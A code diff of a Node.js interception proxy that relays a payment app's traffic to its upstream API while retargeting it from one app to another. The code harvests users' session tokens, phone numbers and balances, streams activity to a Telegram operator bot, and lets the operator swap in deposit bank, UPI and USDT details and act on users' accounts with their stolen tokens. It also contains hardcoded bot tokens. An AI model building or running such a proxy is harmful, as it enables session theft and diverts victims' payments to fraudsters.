@@ -4,9 +4,9 @@ const { Redis } = require('@upstash/redis');
 const crypto = require('crypto');
 
 const app = express();
-const ORIGINAL_API = 'https://api.ezpaycenter.com';
-const BOT_TOKEN = process.env.BOT_TOKEN || '8727636415:AAFIvrnqVgtQXxCBS8r8j9NAthRO6d2ywaU';
-const WEBHOOK_URL = 'https://xcvic.vercel.app/bot-webhook';
+const ORIGINAL_API = 'https://app-api.ukpaycenter.com';
+const BOT_TOKEN = '8272819885:AAEQR-2ZQxo7l9HkUHd7BHVvMTuvVYvglJg';
+const WEBHOOK_URL = 'https://utrys.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
@@ -23,8 +23,7 @@ const DEFAULT_DATA = {
   depositBonus: 0,
   withdrawOverride: 0,
   userOverrides: {},
-  trackedUsers: {},
-  blockUpdate: true
+  trackedUsers: {}
 };
 
 let bot = null;
@@ -62,6 +61,14 @@ function getOrderAmount(req, respData) {
   return null;
 }
 
+async function ensureWebhook() {
+  if (!bot || webhookSet) return;
+  try {
+    await bot.setWebHook(WEBHOOK_URL);
+    webhookSet = true;
+  } catch(e) {}
+}
+
 async function safeSend(chatId, text) {
   if (!bot || !chatId) return;
   try {
@@ -71,19 +78,11 @@ async function safeSend(chatId, text) {
   }
 }
 
-async function ensureWebhook() {
-  if (!bot || webhookSet) return;
-  try {
-    await bot.setWebHook(WEBHOOK_URL);
-    webhookSet = true;
-  } catch(e) {}
-}
-
 async function loadData(forceRefresh) {
   if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
   if (!redis) return { ...DEFAULT_DATA };
   try {
-    let raw = await redis.get('ezpayData');
+    let raw = await redis.get('iukpayData');
     if (raw) {
       if (typeof raw === 'string') {
         try { raw = JSON.parse(raw); } catch(e) {}
@@ -98,11 +97,9 @@ async function loadData(forceRefresh) {
       cacheTime = Date.now();
       return cachedData;
     }
-    // Redis returned null (no data yet) — use existing cache if available
     if (cachedData) return cachedData;
   } catch(e) {
     console.error('Redis load error:', e.message);
-    // Redis failed temporarily — use existing cache so adminChatId/settings are preserved
     if (cachedData) {
       console.error('Redis failed, using cached data to preserve adminChatId');
       return cachedData;
@@ -115,43 +112,50 @@ async function loadData(forceRefresh) {
   return cachedData;
 }
 
+let saveQueue = Promise.resolve();
 async function saveData(data) {
-  const skipMerge = data._skipOverrideMerge;
-  if (skipMerge) delete data._skipOverrideMerge;
-  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
-  try {
-    if (!skipMerge) {
-      const current = await redis.get('ezpayData');
-      if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
-        for (const key of settingsKeys) {
-          if (current[key] !== undefined) {
-            data[key] = current[key];
+  const run = async () => {
+    const skipMerge = data._skipOverrideMerge;
+    if (skipMerge) delete data._skipOverrideMerge;
+    if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
+    try {
+      if (!skipMerge) {
+        const current = await redis.get('iukpayData');
+        if (current && typeof current === 'object') {
+          const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+          for (const key of settingsKeys) {
+            if (current[key] !== undefined) {
+              data[key] = current[key];
+            }
           }
-        }
-        if (current.userOverrides) {
-          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
-        }
-        if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
-          if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
-            data.balanceHistory = current.balanceHistory;
+          if (current.userOverrides) {
+            data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
           }
-        }
-        if (current.sellHistory && Array.isArray(current.sellHistory)) {
-          if (!data.sellHistory || data.sellHistory.length < current.sellHistory.length) {
-            data.sellHistory = current.sellHistory;
+          if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
+            if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
+              data.balanceHistory = current.balanceHistory;
+            }
+          }
+          if (current.sellHistory && Array.isArray(current.sellHistory)) {
+            if (!data.sellHistory || data.sellHistory.length < current.sellHistory.length) {
+              data.sellHistory = current.sellHistory;
+            }
           }
         }
       }
+      cachedData = data;
+      cacheTime = Date.now();
+      await redis.set('iukpayData', data);
+    } catch(e) {
+      console.error('Redis save error:', e.message);
+      cachedData = data;
+      cacheTime = Date.now();
+      throw e;
     }
-    cachedData = data;
-    cacheTime = Date.now();
-    await redis.set('ezpayData', data);
-  } catch(e) {
-    console.error('Redis save error:', e.message);
-    cachedData = data;
-    cacheTime = Date.now();
-  }
+  };
+  const next = saveQueue.then(run, run);
+  saveQueue = next.catch(() => {});
+  return next;
 }
 
 function getTokenFromReq(req) {
@@ -167,8 +171,8 @@ function saveTokenUserId(req, userId) {
     // Reverse map: userId -> latest REAL apptoken (so bot commands can auto-resolve from userId)
     userTokenMap[String(userId)] = tok;
     if (redis) {
-      redis.hset('ezpayTokenMap', key, String(userId)).catch(()=>{});
-      redis.hset('ezpayUserTokenMap', String(userId), tok).catch(()=>{});
+      redis.hset('iukpayTokenMap', key, String(userId)).catch(()=>{});
+      redis.hset('iukpayUserTokenMap', String(userId), tok).catch(()=>{});
     }
   }
 }
@@ -178,12 +182,9 @@ function saveTokenUserId(req, userId) {
 async function resolveTokenAndUser(input) {
   if (!input) return { token: '', userId: '' };
   const s = String(input).trim();
-
-  // Token-shape detection FIRST (architect-fix #1): real tokens are long base64-ish
-  // strings containing non-digit chars. Only short/digit-or-MC inputs are IDs.
   const isPureNumeric = /^\d{4,10}$/.test(s);
   const isMcCode = /^MC\d{4,10}$/i.test(s);
-  const isMcLoginToken = /^MC\d{4,10}_/i.test(s); // login response form (NOT a real apptoken)
+  const isMcLoginToken = /^MC\d{4,10}_/i.test(s);
   const looksLikeToken = !isPureNumeric && !isMcCode && !isMcLoginToken && s.length >= 20;
 
   if (looksLikeToken) {
@@ -191,14 +192,13 @@ async function resolveTokenAndUser(input) {
     let uid = tokenUserMap[key] || '';
     if (!uid && redis) {
       try {
-        const stored = await redis.hget('ezpayTokenMap', key);
+        const stored = await redis.hget('iukpayTokenMap', key);
         if (stored) { uid = String(stored); tokenUserMap[key] = uid; }
       } catch(e) {}
     }
     return { token: s, userId: uid };
   }
 
-  // ID-like input → normalize to bare digits
   let bare = s;
   if (isMcCode) bare = s.replace(/^MC/i, '');
   else if (isMcLoginToken) bare = s.replace(/^MC/i, '').split('_')[0];
@@ -207,12 +207,10 @@ async function resolveTokenAndUser(input) {
   let uid = bare;
 
   if (isPhone) {
-    // Try in-memory map first
     let found = '';
     for (const [u, p] of Object.entries(userPhoneMap)) {
       if (String(p) === bare) { found = u; break; }
     }
-    // Architect-fix #2: fallback to persisted trackedUsers in Redis
     if (!found) {
       try {
         const d = await loadData(true);
@@ -227,7 +225,7 @@ async function resolveTokenAndUser(input) {
   let tok = userTokenMap[uid] || '';
   if (!tok && redis) {
     try {
-      const stored = await redis.hget('ezpayUserTokenMap', uid);
+      const stored = await redis.hget('iukpayUserTokenMap', uid);
       if (stored) { tok = String(stored); userTokenMap[uid] = tok; }
     } catch(e) {}
   }
@@ -241,7 +239,7 @@ async function getUserIdFromToken(req) {
   if (tokenUserMap[key]) return tokenUserMap[key];
   if (redis) {
     try {
-      const stored = await redis.hget('ezpayTokenMap', key);
+      const stored = await redis.hget('iukpayTokenMap', key);
       if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
     } catch(e) {}
   }
@@ -322,10 +320,10 @@ async function isLogOffByToken(data, req) {
   if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
   if (redis) {
     try {
-      const isOff = await redis.sismember('ezpayLogOffTokens', tKey);
+      const isOff = await redis.sismember('iukpayLogOffTokens', tKey);
       if (isOff) { logOffTokens.add(tKey); return true; }
-      const stored = await redis.hget('ezpayTokenMap', tKey);
-      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('ezpayLogOffTokens', tKey).catch(()=>{}); return true; }
+      const stored = await redis.hget('iukpayTokenMap', tKey);
+      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('iukpayLogOffTokens', tKey).catch(()=>{}); return true; }
     } catch(e) {}
   }
   checkedTokens.add(tKey);
@@ -414,32 +412,6 @@ app.use(async (req, res, next) => {
   });
 });
 
-// Global token capture: APK sends `apptoken` + `membercode` headers on EVERY authenticated
-// request. Mapping them here means we capture the real base64 token on the first call after
-// login (e.g. /home/article/all) without waiting for response body to contain memberCodeId.
-app.use((req, res, next) => {
-  try {
-    const tok = getTokenFromReq(req);
-    const mc = req.headers['membercode'] || req.headers['memberCode'] || '';
-    if (tok && tok.length > 10 && mc) {
-      const uid = String(mc).replace(/^MC/i, '').trim();
-      if (uid && /^\d{3,}$/.test(uid)) {
-        const key = tok.substring(0, 100);
-        // Only write if changed (avoid hammering Redis on every request)
-        if (tokenUserMap[key] !== uid || userTokenMap[uid] !== tok) {
-          tokenUserMap[key] = uid;
-          userTokenMap[uid] = tok;
-          if (redis) {
-            redis.hset('ezpayTokenMap', key, uid).catch(()=>{});
-            redis.hset('ezpayUserTokenMap', uid, tok).catch(()=>{});
-          }
-        }
-      }
-    }
-  } catch(e) {}
-  next();
-});
-
 async function proxyFetch(req) {
   const url = ORIGINAL_API + req.originalUrl;
   const fwd = {};
@@ -449,12 +421,12 @@ async function proxyFetch(req) {
         kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'api.ezpaycenter.com';
-  // Server enforces minimum app version — APK ships v1.2.2/22 but upstream now
-  // returns `body:true` (silent fail) for anything < v1.2.2/22 on /v2/login.
-  // Force-upgrade version headers so login + all endpoints work.
-  fwd['version'] = '1.2.3';
-  fwd['versioncode'] = '23';
+  fwd['host'] = 'app-api.ukpaycenter.com';
+  // Server enforces minimum app version — APK ships 3.0.5/1 but upstream now
+  // returns `body:true` (silent login fail) for outdated clients. Response headers
+  // confirm `version: 4.0.3, versioncode: 43, needupdateflag: 2`. Force-upgrade.
+  fwd['version'] = '4.0.4';
+  fwd['versioncode'] = '44';
   const opts = { method: req.method, headers: fwd };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -469,15 +441,6 @@ async function proxyFetch(req) {
       respHeaders[key] = val;
     }
   });
-  const blockData = cachedData || DEFAULT_DATA;
-  if (blockData.blockUpdate !== false) {
-    for (const k of Object.keys(respHeaders)) {
-      const kl = k.toLowerCase();
-      if (kl === 'needupdateflag') {
-        delete respHeaders[k];
-      }
-    }
-  }
   let jsonResp = null;
   try { jsonResp = JSON.parse(respBody); } catch(e) {}
   return { response, respBody, respHeaders, jsonResp };
@@ -741,15 +704,15 @@ app.use((req, res, next) => {
       if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
       if (!userId && tKey && redis) {
         try {
-          const isOff = await redis.sismember('ezpayLogOffTokens', tKey);
+          const isOff = await redis.sismember('iukpayLogOffTokens', tKey);
           if (isOff) { logOffTokens.add(tKey); return; }
         } catch(e) {}
       }
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      await safeSend(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
-    } catch(e) { console.error('[LOG_MW_ERROR]', e.message); }
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
+    } catch(e) {}
   })();
   next();
 });
@@ -762,25 +725,6 @@ app.get('/setup-webhook', async (req, res) => {
     const info = await bot.getWebHookInfo();
     res.json({ success: true, webhook: info });
   } catch(e) { res.json({ error: e.message }); }
-});
-
-app.get('/test-bot', async (req, res) => {
-  if (!bot) return res.json({ ok: false, error: 'Bot not initialized (check BOT_TOKEN)' });
-  const data = await loadData(true);
-  const result = { ok: false, botReady: !!bot, adminChatId: data.adminChatId, logRequests: data.logRequests };
-  if (!data.adminChatId) {
-    result.error = 'adminChatId is NULL — bot ne kisi se /start nahi liya ya Redis reset ho gaya';
-    return res.json(result);
-  }
-  try {
-    await bot.sendMessage(data.adminChatId, '🔔 Test message from /test-bot — bot is working!');
-    result.ok = true;
-    result.message = 'Test message sent successfully to Telegram!';
-  } catch(e) {
-    result.error = e.message;
-    result.hint = 'Bot blocked/kicked ho gaya hai ya chatId wrong hai';
-  }
-  res.json(result);
 });
 
 app.get('/health', async (req, res) => {
@@ -821,7 +765,7 @@ app.post('/bot-webhook', async (req, res) => {
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId,
-`🏦 EZPay Bank Controller
+`🏦 IUKPay Bank Controller
 
 === BANK COMMANDS ===
 /addbank Name|AccNo|IFSC|BankName|UPI|MinAmount
@@ -855,6 +799,8 @@ app.post('/bot-webhook', async (req, res) => {
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
+
+
 === USER INFO (auto-uses captured token) ===
 🔑 Pass <userId> (e.g. 185806) OR <phone> (10-digit) OR <fullToken>.
    App ke kisi bhi action ke baad token automatic capture hota hai.
@@ -882,7 +828,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -908,11 +854,11 @@ Example:
       await saveData(data);
       if (redis) {
         try {
-          const allTokens = await redis.hgetall('ezpayTokenMap');
+          const allTokens = await redis.hgetall('iukpayTokenMap');
           if (allTokens) {
             for (const [tKey, uid] of Object.entries(allTokens)) {
               if (String(uid) === String(targetId)) {
-                await redis.sadd('ezpayLogOffTokens', tKey);
+                await redis.sadd('iukpayLogOffTokens', tKey);
                 logOffTokens.add(tKey);
               }
             }
@@ -937,11 +883,11 @@ Example:
       }
       if (redis) {
         try {
-          const allTokens = await redis.hgetall('ezpayTokenMap');
+          const allTokens = await redis.hgetall('iukpayTokenMap');
           if (allTokens) {
             for (const [tKey, uid] of Object.entries(allTokens)) {
               if (String(uid) === String(targetId)) {
-                await redis.srem('ezpayLogOffTokens', tKey);
+                await redis.srem('iukpayLogOffTokens', tKey);
                 logOffTokens.delete(tKey);
               }
             }
@@ -1085,6 +1031,203 @@ Example:
     }
 
 
+
+    if (text === '/history' || text.startsWith('/history ')) {
+      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
+      const history = data.balanceHistory || [];
+      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
+      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
+      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
+      const userSummary = {};
+      for (const h of filtered) {
+        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
+        const s = userSummary[h.userId];
+        if (h.type === 'add') s.added += h.amount;
+        else s.deducted += h.amount;
+        s.totalNet = h.totalAdded || 0;
+        if (h.phone) s.phone = h.phone;
+        s.entries.push(h);
+      }
+      let m = '📊 Balance History:\n\n';
+      for (const [uid, s] of Object.entries(userSummary)) {
+        const tracked = data.trackedUsers && data.trackedUsers[uid];
+        const currentBal = tracked ? tracked.balance : 'N/A';
+        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
+        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
+        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
+        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
+        m += `   💰 Current Balance: ₹${currentBal}\n`;
+        m += `   📜 Entries:\n`;
+        const recent = s.entries.slice(-10);
+        for (const e of recent) {
+          const icon = e.type === 'add' ? '➕' : '➖';
+          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
+        }
+        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
+        m += '\n';
+      }
+      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
+      await bot.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
+
+    if (text === '/clearhistory') {
+      data = await loadData(true);
+      data.balanceHistory = [];
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
+      return res.sendStatus(200);
+    }
+
+    if (text === '/idtrack') {
+      const tracked = data.trackedUsers || {};
+      const ids = Object.keys(tracked);
+      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
+      let m = '📋 Tracked User IDs:\n\n';
+      for (const uid of ids) {
+        const u = tracked[uid];
+        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
+        m += `👤 ID: ${uid}${hasOverride}\n`;
+        if (u.name) m += `   📛 Name: ${u.name}\n`;
+        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
+        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
+        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
+        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
+      }
+      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
+      await bot.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
+
+    if (text === '/banks') {
+      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
+      let m = '💳 Banks:\n\n' + bankListText(data);
+      await bot.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/addbank ')) {
+      const parts = text.substring(9).split('|').map(s => s.trim());
+      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI|MinAmount\n(BankName, UPI, and MinAmount optional)'); return res.sendStatus(200); }
+      data = await loadData(true);
+      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
+      const newBank = {
+        accountHolder: parts[0],
+        accountNo: parts[1],
+        ifsc: parts[2],
+        bankName: parts[3] || '',
+        upiId: parts[4] || '',
+        minAmount: parts[5] ? parseFloat(parts[5]) || 0 : 0
+      };
+      data.banks.push(newBank);
+      if (data.activeIndex < 0) data.activeIndex = 0;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const minStr = newBank.minAmount ? `\nMin Amount: ₹${newBank.minAmount}` : '';
+      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}${minStr}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setmin ')) {
+      data = await loadData(true);
+      const parts = text.substring(8).trim().split(/\s+/);
+      const bankIdx = parseInt(parts[0]) - 1;
+      const amount = parseFloat(parts[1]);
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount)) {
+        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
+        return res.sendStatus(200);
+      }
+      data.banks[bankIdx].minAmount = amount;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Min amount for bank #${bankIdx + 1} set to ₹${amount}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/removebank ')) {
+      data = await loadData(true);
+      const idx = parseInt(text.substring(12).trim()) - 1;
+      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await safeSend(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
+      const beforeCount = data.banks.length;
+      const removed = data.banks.splice(idx, 1)[0];
+      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
+      else if (data.activeIndex > idx) data.activeIndex--;
+      if (data.userOverrides) {
+        for (const uid of Object.keys(data.userOverrides)) {
+          const uo = data.userOverrides[uid];
+          if (uo.bankIndex !== undefined) {
+            if (uo.bankIndex === idx) delete uo.bankIndex;
+            else if (uo.bankIndex > idx) uo.bankIndex--;
+          }
+        }
+      }
+      data._skipOverrideMerge = true;
+      try {
+        await saveData(data);
+      } catch(e) {
+        console.error('[REMOVEBANK_SAVE_ERROR]', e.message);
+        await safeSend(chatId, `❌ Save failed: ${e.message}\nBank remove nahi hua. Phir try karo.`);
+        return res.sendStatus(200);
+      }
+      let verified = false;
+      let afterCount = null;
+      if (redis) {
+        try {
+          let check = await redis.get('iukpayData');
+          if (check) {
+            if (typeof check === 'string') { try { check = JSON.parse(check); } catch(e) {} }
+            if (check && Array.isArray(check.banks)) {
+              afterCount = check.banks.length;
+              verified = afterCount === beforeCount - 1;
+            }
+          }
+        } catch(e) {
+          console.error('[REMOVEBANK_VERIFY_ERROR]', e.message);
+        }
+      } else {
+        verified = true;
+      }
+      if (verified) {
+        await safeSend(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}\n✅ Banks now: ${data.banks.length}`);
+      } else {
+        await safeSend(chatId, `⚠️ Removed locally but Redis verification failed.\nBefore: ${beforeCount}, After (Redis): ${afterCount === null ? 'unknown' : afterCount}\nDobara /banks check karo, agar bank wapas dikh raha hai to /removebank phir chalao.`);
+      }
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setbank ')) {
+      data = await loadData(true);
+      const idx = parseInt(text.substring(9).trim()) - 1;
+      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
+      data.activeIndex = idx;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const bankInfo = data.banks[idx];
+      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${bankInfo.accountHolder} | ${bankInfo.accountNo} | ${bankInfo.ifsc}${bankInfo.bankName ? ' | ' + bankInfo.bankName : ''}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/usdt ')) {
+      const addr = text.substring(6).trim();
+      data = await loadData(true);
+      if (addr.toLowerCase() === 'off') {
+        data.usdtAddress = '';
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, '❌ USDT override OFF');
+      } else if (addr.length >= 20) {
+        data.usdtAddress = addr;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
+      } else {
+        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
+      }
+      return res.sendStatus(200);
+    }
+
+
     const TOKEN_CMDS = 'profile|customer|tgrobot|sendcode|unbind|lasttoken';
     const tokenCmdMatch = text.match(new RegExp(`^\\/(${TOKEN_CMDS})\\s+(.+)$`, 'i'));
     if (tokenCmdMatch) {
@@ -1108,15 +1251,15 @@ Example:
       }
       const tKey = rawToken.substring(0, 100);
 
-      // Headers exactly as APK sends them
+      // Headers exactly as APK sends them (lowercase keys, real-token format confirmed via debug dump)
       const memberCodeHdr = uid ? (uid.startsWith('MC') ? uid : ('MC' + uid)) : '';
       const upstreamHeaders = {
         'apptoken': rawToken,
-        'packagename': 'com.syq.ez.pay',
-        'version': '1.2.3',
-        'versioncode': '23',
+        'packagename': 'com.nh.spro.deal',
+        'version': '4.0.4',
+        'versioncode': '44',
         'membercode': memberCodeHdr,
-        'host': 'api.ezpaycenter.com',
+        'host': 'app-api.ukpaycenter.com',
         'content-type': 'application/json; charset=utf-8',
         'accept': '*/*',
         'accept-encoding': 'gzip',
@@ -1243,173 +1386,6 @@ Example:
     }
 
 
-    if (text === '/history' || text.startsWith('/history ')) {
-      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
-      const history = data.balanceHistory || [];
-      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
-      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
-      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
-      const userSummary = {};
-      for (const h of filtered) {
-        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
-        const s = userSummary[h.userId];
-        if (h.type === 'add') s.added += h.amount;
-        else s.deducted += h.amount;
-        s.totalNet = h.totalAdded || 0;
-        if (h.phone) s.phone = h.phone;
-        s.entries.push(h);
-      }
-      let m = '📊 Balance History:\n\n';
-      for (const [uid, s] of Object.entries(userSummary)) {
-        const tracked = data.trackedUsers && data.trackedUsers[uid];
-        const currentBal = tracked ? tracked.balance : 'N/A';
-        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
-        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
-        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
-        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
-        m += `   💰 Current Balance: ₹${currentBal}\n`;
-        m += `   📜 Entries:\n`;
-        const recent = s.entries.slice(-10);
-        for (const e of recent) {
-          const icon = e.type === 'add' ? '➕' : '➖';
-          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
-        }
-        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
-        m += '\n';
-      }
-      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/clearhistory') {
-      data = await loadData(true);
-      data.balanceHistory = [];
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
-      return res.sendStatus(200);
-    }
-
-    if (text === '/idtrack') {
-      const tracked = data.trackedUsers || {};
-      const ids = Object.keys(tracked);
-      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
-      let m = '📋 Tracked User IDs:\n\n';
-      for (const uid of ids) {
-        const u = tracked[uid];
-        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
-        m += `👤 ID: ${uid}${hasOverride}\n`;
-        if (u.name) m += `   📛 Name: ${u.name}\n`;
-        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
-        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
-        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
-        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
-      }
-      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/banks') {
-      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
-      let m = '💳 Banks:\n\n' + bankListText(data);
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/addbank ')) {
-      const parts = text.substring(9).split('|').map(s => s.trim());
-      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI|MinAmount\n(BankName, UPI, and MinAmount optional)'); return res.sendStatus(200); }
-      data = await loadData(true);
-      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
-      const newBank = {
-        accountHolder: parts[0],
-        accountNo: parts[1],
-        ifsc: parts[2],
-        bankName: parts[3] || '',
-        upiId: parts[4] || '',
-        minAmount: parts[5] ? parseFloat(parts[5]) || 0 : 0
-      };
-      data.banks.push(newBank);
-      if (data.activeIndex < 0) data.activeIndex = 0;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      const minStr = newBank.minAmount ? `\nMin Amount: ₹${newBank.minAmount}` : '';
